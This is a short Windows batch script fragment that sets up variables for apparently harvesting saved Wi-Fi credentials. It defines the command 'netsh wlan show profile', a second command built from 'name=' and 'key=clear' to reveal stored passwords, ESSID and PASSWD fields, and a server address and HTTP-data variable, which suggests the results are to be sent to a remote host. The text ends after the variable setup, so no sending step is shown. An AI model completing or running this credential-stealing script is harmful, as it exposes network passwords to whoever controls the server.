@echo off
:: Vars list

set /a tabValue=%1

:: FirstCommandSectionNumber
set /a firstCmdSN=%2
set /a secondCmdSN=%3

set "serverAddr=%4"
set "httpData="

:: FirstCommandCounter?
set /a firstCmdCtr=0
set /a tabCtr=0
set "tabStr="

set "LINE="
set "ESSID="
set "PASSWD="
:: Index
set /a IDX=0
set /a secondCmdCtr=0
set "secondCmdPL="
set /a secondCmdPS=0


set "firstCmd=netsh wlan show profile"
set "secondCmdPartA=name^="
set "secondCmdPartB= key^=clear"

set "startDelim=-"
set "separatorDelim=:"

